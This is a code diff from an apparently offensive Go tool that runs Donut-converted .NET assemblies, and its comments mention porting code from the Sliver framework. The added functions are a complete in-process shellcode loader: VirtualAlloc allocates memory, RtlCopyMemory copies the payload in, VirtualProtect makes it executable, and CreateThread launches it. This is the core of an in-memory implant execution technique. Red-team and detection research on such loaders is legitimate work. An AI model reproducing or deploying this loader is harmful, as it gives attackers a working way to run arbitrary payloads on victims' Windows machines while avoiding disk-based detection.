@@ -11,6 +11,7 @@ import (
 	"bytes"
 	"time"
 	"syscall"
+	"unsafe"
 
 	"golang.org/x/sys/windows"
 	"github.com/rawk77/goAssembly/syscalls"
@@ -80,13 +81,95 @@ func main() {
 	log.Printf("Assembly Args supplied: %v\n", assemblyArgsStr)
 	log.Printf("Process supplied: %v\n", process)
 
-	resp, err := ExecuteAssembly(donutBytes, process)
+	resp, err := ExecuteInlineAssembly(donutBytes)
 	if err != nil {
 		fmt.Printf("%s", err)
 		return
 	}
 
 	fmt.Println(resp)
+}
+
+// Execute Assembly in the current process
+func ExecuteInlineAssembly(data []byte) (string, error) {
+	var (
+		stdoutBuf, stderrBuf bytes.Buffer
+	)
+	// defer windows.CloseHandle(handle)
+	// defer windows.CloseHandle(lpTargetHandle)
+	// currentProcHandle, err := windows.GetCurrentProcess()
+	// if err != nil {
+	// 	log.Println("GetCurrentProcess failed")
+	// 	return "", err
+	// }
+	// err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
+	// if err != nil {
+	// 	log.Println("DuplicateHandle failed")
+	// 	return "", err
+	// }
+	threadHandle, err := injectInlineTask(data, false)
+	if err != nil {
+		return "", err
+	}
+	err = waitForCompletion(threadHandle)
+	if err != nil {
+		return "", err
+	}
+
+	return stdoutBuf.String() + stderrBuf.String(), nil
+}
+
+// injectInlineTask - Injects shellcode into the current process handle
+func injectInlineTask(data []byte, rwxPages bool) (windows.Handle, error) {
+	var (
+		err        error
+		procAddr   uintptr
+		threadHandle windows.Handle
+	)
+	dataSize := len(data)
+	// Allocate memory in the target process
+	log.Println("allocating process memory ...")
+	if rwxPages {
+		procAddr, err = syscalls.VirtualAlloc(uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	} else {
+		procAddr, err = syscalls.VirtualAlloc(uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	}
+	
+	log.Printf("virtualalloc returned: procAddr = %#x, err = %v", procAddr, err)
+	
+	if err != nil {
+		
+		log.Println("[!] failed to allocate remote process memory")
+		
+		return threadHandle, err
+	}
+
+	// Write the shellcode into the remotely allocated buffer
+	syscalls.RtlCopyMemory(procAddr, (uintptr)(unsafe.Pointer(&data[0])), uint32(dataSize))
+
+	if !rwxPages {
+		var oldProtect uint32
+		// Set proper page permissions
+		err = syscalls.VirtualProtect(procAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
+		if err != nil {
+			log.Println("VirtualProtect failed:", err)
+			return threadHandle, err
+		}
+	}
+	// Create the remote thread to where we wrote the shellcode
+	log.Println("successfully injected data, starting remote thread ....")
+	
+	attr := new(windows.SecurityAttributes)
+	var lpThreadId uint32
+	threadHandle, err = syscalls.CreateThread(attr, 0, procAddr, uintptr(0), 0, &lpThreadId)
+	
+	log.Printf("createthread returned:  err = %v", err)
+	
+	if err != nil {
+		log.Printf("[!] failed to create remote thread")
+		return threadHandle, err
+	}
+	return threadHandle, nil
 }
 
 // From Sliver... port to run standalone
